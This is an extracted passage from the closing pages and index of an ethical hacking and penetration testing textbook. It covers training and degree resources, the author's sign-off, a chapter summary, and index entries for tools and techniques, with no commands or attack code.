on the Black Hat website at http://www.blackhat.com.
[Word Count: 97]

The crew responsible for creating and distributing Kali Linux also offers a hands-
on highly intense series of classes. These classes will challenge you and push you
by making you work through a series of realistic scenarios.
[Word Count: 37]

Even traditional universities are beginning to get into the security mode today.
Just a few years ago, it was difﬁcult to ﬁnd any security-related curriculum. Now,
most universities offer at least one class or devote time during a class to cover
some security. Dakota State University (DSU) (where I teach) in Madison, SD,
offers several on-campus and online degrees which are dedicated entirely to
security. DSU has two Bachelor’s Degrees available: Cyber Operations and
Network Security Administration, a Master’s Degree in Information Assurance,
and even a Doctorate of Science degree in Information Assurance.
[Word Count: 93]

If you are interested in pursuing a security-related degree through a higher edu-
cation institution, you are highly encouraged to attend an NSA-accredited Center
of Academic Excellence. These programs are information assurance education
degrees that have undergone a designation by the National Security Agency or the
Department of Homeland Security to verify the value of the curriculum. You can
[Word Count: 59]

The Basics of Hacking and Penetration Testing
196
[Word Count: 8]

ﬁnd more about this program at http://www.nsa.gov/ia/academic_outreach/nat_
cae/index.shtml. Finally, if you want to attend a school where “offensive security”
is taken very seriously and has undergone a rigorous external review, look for
programs, which have been designated as National Centers of Excellence in Cyber
Operations. You can ﬁnd more details on the designation as well as the exclusive
list of these schools at http://www.nsa.gov/academia/nat_cae_cyber_ops/nat_
cae_co_centers.shtml.
[Word Count: 65]

Another great penetration testing methodology can be found at http://www.
vulnerabilityassessment.co.uk. The Penetration Testing Framework (PTF) is an
excellent resource for penetration testers and security assessment teams. The PTF
includes assessment templates as well as a robust list of tools that can be used to
conduct each phase.
[Word Count: 48]

For those of you who stuck with the book, completed each of the examples, and
gave an honest effort at following along, at the very least, this book should have
provided you with the knowledge and ability to see the big picture and under-
stand the importance of each phase.
[Word Count: 50]

You also now should have the ability to answer the question posed to you in
a scenario at the beginning of Chapter 2:
[Word Count: 23]

Assume you are an ethical penetration tester working for a security
company. Your boss walks over to your ofﬁce and hands you a piece of
[Word Count: 25]

Wrapping Up the Penetration Test
CHAPTER 8
197
[Word Count: 8]

paper. “I just got off the phone with the CEO of that company. She wants
my best employee to Pen Test his companydthat’s you. Our Legal
Department will be sending you an e-mail conﬁrming we have all of the
proper authorizations and insurance.” You nod, accepting the job. He
leaves. You ﬂip over the paper, a single word is written on the paper,
“Syngress”. It is a company you have never heard of before, and no
other information is written on the paper.
What now?
[Word Count: 85]

One of the greatest attributes of penetration testing and hacking is that you never
reach the end. Just about the time you master a particular topic or technique,
someone develops a new method, attack, or procedure. That is not to say that
your original skill set is obsolete. On the contrary, a solid understanding of the
basics provides you with a lifelong foundation for learning the advanced topics
and staying current with the rapid pace of change.
[Word Count: 77]

I always enjoy hearing from readers, so feel free to send me an e-mail or
hit me up on twitter: @pengebretson
Enjoy the journey!
Patrick
[Word Count: 25]

This chapter focused on the importance of writing the penetration testing report
and examined speciﬁc details about what needs to be included and potential
pitfalls for hackers who have never written a penetration testing report. The
importance of presenting a quality report to the client was emphasized. It
concluded with suggestions about where you can go to further enhance your
hacking skills once you have mastered the basics. Speciﬁc recommendations for
getting advanced training and becoming part of the security community were
also outlined.
[Word Count: 84]

The Basics of Hacking and Penetration Testing
198
[Word Count: 8]

Note: Page numbers with “f” denote ﬁgures’ “t” tables; and “b” boxes.
[Word Count: 12]

A
Advanced Package Tool (APT),
5be6b
Arduino attack vectors, 138e139
Armitage, 116
command, 117
connection exception, 117e118
Hail Mary function, 117
initial Armitage screen, 118
main Armitage screen, 118
starting Armitage, 117e118
utilization, 117. See also
exploitation
Attack machine
dhclient command, 11
DHCP use, 11
DNS server, 10
icon to launch terminal window,
9f
ifconﬁg command, 10
IP address, 10
Linux distributions, 9e10
lo interface, 10
review steps, 11
for running Kali or Backtrack, 9
for turning network card on, 10
Automated attacks, 125
[Word Count: 84]

B
Back Oriﬁce, 185
Backdoor, 17, 48e49, 168.
See also Netcat
Backtrack Linux, 4e7, 13
advantage, 9
attack machine to run, 9
boot options, 8f
burning process, 7
GRUB bootloader boot menu, 8
Paros, 6
safe graphical mode, 8
security community, 6
VMware image, 7e8
[Word Count: 45]

VMware Player, 7e8
VMware software role, 11
Base64 encoding, 153
Bdcli100.exe client software, 176
Black box penetration testing, 4
Black Hat conference, 196
Brute forcing program, 83
Burp Suite, 165
[Word Count: 30]

C
Code injection attacks
bypass client-side
authentication, 156
generic framework, 154
interpreted language, 153
SQL, 153e155
or statement, 155
unintended commands,
153e154
web applications, 156
Credential harvester, 136
captured credentials, 136
employee satisfaction survey,
136e137
on fake Gmail website, 137
HTTPS, 136
web attack vectors, 136e137
from website, 137
Cross-site scripting (XSS),
142e144
attacking method, 157
First-Order, 159
penetration tester, 158
reﬂected and stored, 159
skilled attacker, 157
stored, 159
test code, 158
username and password, 158
Cryptcat, 174
ek switch, 174
tunnel encryption, 174
twoﬁsh encryption, 174
[Word Count: 88]

D
Dakota State University (DSU),
26, 196
Damn Vulnerable Web App
(DVWA), 164
De-ICE Linux CD, 123
DEFCON, 194e195
DerbyCon, 195
Dig, 42e43
Digital reconnaissance, 21
Directory browsing, 30
Domain Name System (DNS),
10, 34
interrogation, 42
servers, 39
Dsniff tools, 113
DSU. See Dakota State University
DVWA. See Damn Vulnerable
Web App
[Word Count: 53]

E
E-mail servers, 44
rejected message, 44
target e-mail server, 44
Exchange server, 136e137
Executive summary, 189
Exploitation, 79e80
Armitage, 116e118
concept of, 79e81
automated attacks, 125
ettercap, 125
buffer overﬂows, 126
password brute forcing tool
hydra, 124
personal password dictionary,
124
RainbowCrack, 124
stack and heap-based buffer
overﬂows, 125
further practice,
124e126
JtR, 97e100
[Word Count: 55]

Exploitation (Continued)
Linux and OS X password cracking,
107e108
local password hacking, 100e106
macof, 112e116
Medusa, 81e85
Metasploit, 85e97
multiple tools, 119e120
password resetting, 108e111
phase, 17
practice, 122e124
remote password hacking,
106e107
snifﬁng (Wireshark), 111e112
[Word Count: 36]

F
Fierce, 43e44
brute-force host names, 43
directory, 43
in Kali, 43
File transfer protocol (FTP), 32, 59,
81
First-Order XSS, 159
FOCA, 50
[Word Count: 24]

G
Google directives, 26e31
allintitle, 27
command to, 26
directory browsing, 30
dynamic content, 20, 30
examples of, 26
GHDB, 29f, 30f
ﬁletype directive, 28
intitle, 27
inurl directive, 27
live chat features, 30e31
PC tech example, 31
power of, 29f
public forums, 31
utilization, 26. See also
reconnaissance
Google Dorks, 28e29
Google-FU. See Google directives
Graphical user interface (GUI), 59,
86
[Word Count: 62]

H
Hacker Defender, 176e180
cmd shell, 178
conﬁguration ﬁles, 176
full-ﬂedged Windows Rootkit,
176
[Word Count: 14]

I
Information extraction
dig, 42e43
DNS servers, 39e40
from e-mail servers, 44
Fierce, 43e44
MetaGooFil, 44e46
nslookup, 41e42
sharing process, 40
zone transfer, 40. See also
reconnaissance
Information gathering.
See reconnaissance
Internet Control Message Protocol
(ICMP), 57
[Word Count: 37]

J
Java applet attack, 131
John the Ripper (JtR), 82
directory, 99
encrypted version, 98
four-step process, 99
hashing algorithms, 98e99
local attack, 99e100
performance metrics list, 99
red team exercises, 97e98
remote attack, 99e100
user or guest group, 97
[Word Count: 40]

K
Kali Linux, 4e9, 7b
advantage, 9
attack machine to run, 9
burning process, 7
GRUB bootloader boot menu, 8
security community, 6
VMware Player, 7e8
VMware software role, 11
[Word Count: 30]

L
Lan Manager (LM), 99, 103e104
Linux password cracking
privilege level, 107
privileged users, 107
SHA, 108
shadow ﬁle, 107
system ﬁle, 107e108
Local password cracking
brute forcing letter combinations,
105
cracked passwords, 105
extracting and viewing password
hashes, 102e103
format_name command, 105
hashes.txt ﬁle, 103, 105
invoking samdump2 program, 102
LM password cracking, 103e104
mkdir command, 101
mount command, 101
mounting local drive, 101
NTLM, 104
remote password cracking, 106
SAM ﬁle, 100e102
samdump2 command, 101e102
super secret password, 104
utilizing Meterpreter, 106
[Word Count: 84]

VNC payload, 106
Windows passwords cracking, 106.
See also exploitation
[Word Count: 10]

N
Ncat tool, 185
Netbus tool, 185
Netcat, 168e174
backdoors, 184
client or server mode, 169
communication, 170
ee switch, 172, 184
force Netcat, 171
further practice, 185
keyboard input, 171
Linux version, 170
listener mode, 169
“ls” command, 171
“man” pages, 184
Meterpreter shell, 173
nc.exe program, 173
practice, 183e184
Rootkits, 184
[Word Count: 53]

O
Offensive security, 4
Online password crackers, 81
Open Web Application Security
Project (OWASP), ZAP. See Zed
Attack Proxy (ZAP)
Open-Source Intelligence (OSINT),
21
OpenVAS, 77
[Word Count: 26]

blocking ping packets, 59
cat command, 58e59
FPing, 58
switches, 59
Pings, 57e59
command, 57e58, 57f
ICMP echo request packet, 58
replacing target_ip, 57
Port scanning, 59
command line version, 59e60
ﬁngerprinting operating system, 71
gain access to target system, 60
GUI-driven way, 60
list of open ports, 71
Nmap and, 59
switches, 71
target_ip, 71
timing switch, 71
version scanning, 71
Powershell injection technique,
133, 139
Promiscuous mode, 111
PTES. See Penetration Testing
Execution Standard
PTF. See Penetration Testing
Framework
PyInjector vectors, 133
Python script, 45, 126
[Word Count: 88]

R
RainbowCrack, 124
Raw output, 191e194
direct output tools, 191
document encryption, 192
electronic document, 192
grammar and spelling mistakes,
193
professional-looking report, 193
report-writing phase, 194
well written penetration test, 193
Reconnaissance, 19f, 20, 50
active, 22
attackable targets ﬁnding, 49
automated tools, 20e21
dig, 42e43
digital, 21
DNS servers, extracting
information from, 39e40
e-mal servers, extracting
information from, 44
Fierce, 43e44
[Word Count: 63]

further practice, 50e51
Google Directives, 26e31
Harvester, 31e34
host tool, 39
HTTrack, 23e26
MetaGooFil, 44e46
Netcraft, 37e38
NS Lookup, 41e42
passive, 22
practice steps, 50
public information search,
21
social engineering, 48e49
Syngress, 20, 23
Threatagent Drone, 46e47
Whois, 34e37
Remote system, maintaining access
to, 167e168
using backdoor, 168
Cryptcat, 174
Hacker Defender, 176e180
Meterpreter, 168
Netcat, 168e174
Rootkits, 168
Request for comments (RFC),
67
Rootkits, 174e176, 181
antivirus, 175
detecting and defending against,
180e181
ﬁles hiding, 174
software package, 175
stealthy backdoor access, 176
“su” or “Run As” commands,
180e181
trafﬁc, 181. See also hacker
defender
[Word Count: 97]

S
SAM ﬁle. See security account
manager
Scanning, 54
analogy, 55
concept of, 53e57
ﬁnal target, 56
further practice, 77e78
Nmap, 61e70
NSE and, 55
null scan, using Nmap, 68e69
perimeter devices, 57
ping sweeps, 57e59
pings, 57e59
port, 54e55
port numbers and service, 56t
[Word Count: 45]

SQL. See structured query language
SSH. See secure shell
Stack and heap-based buffer
overﬂows, 125
Startup Run programs, 178
Structured query language (SQL),
142e144
injection, 153e154
statements, 154e155
SubSeven (Sub7), 185
Swiss army knife internet tool,
51
Syngress, 20
[Word Count: 39]

T
TCP. See transmission control
protocol
ThreatAgent Drone, 46e47
attack vector identiﬁcation,
47f
drone, 46e47
option for reconnaissance, 46
results, 47f
starting search with, 46f
Transmission control protocol
(TCP), 59, 169
TrueCrypt, 192
TrustedSec program, 135
Tunnel encryption, 174
Twoﬁsh encryption, 174
[Word Count: 42]

U
Ubuntu 7.04, 122e123
Uniform resource locator (URL),
21, 134, 142e144
User datagram protocol (UDP), 59,
169
[Word Count: 17]

V
Virtual machine (VM), 7, 122,
169b
Virtual network computing (VNC),
81
payload, 106
software, 92
Virtual Private Network (VPN),
32
VMware image, 7
Vulnerability scanning, 16, 55, 70,
72e76
Nessus, 72, 74, 75f
plug-in, 73
[Word Count: 36]

result link, 76
safe checks, 75
scan policies, 75
scan targets box, 76
setting up “safe” scan option,
74f
[Word Count: 19]

White box penetration testing, 4
Windows XP, 13
Wireshark, 111e112
Capture Interface window,
113e115
command, 114, 125
hub, 108e109
“list available capture interfaces”
button, 114
Linux target, 115
MAC address, 112
nonpromiscuous mode, 111
[Word Count: 34]

promiscuous mode, 111
snifﬁng, 108, 111, 116
stopping Wireshark capture,
115e116
[Word Count: 11]

Z
Zed Attack Proxy (ZAP), 160
break points functionality, 161
[Word Count: 10]

Iceweasel proxy settings
conﬁguration, 160
input variables, 161
interception, 161e162
in Kali menu, 160
scanning, 163
spidering, 162e163
Zone transfer, 40, 42e44
[Word Count: 22]

Total Paragraphs: 1175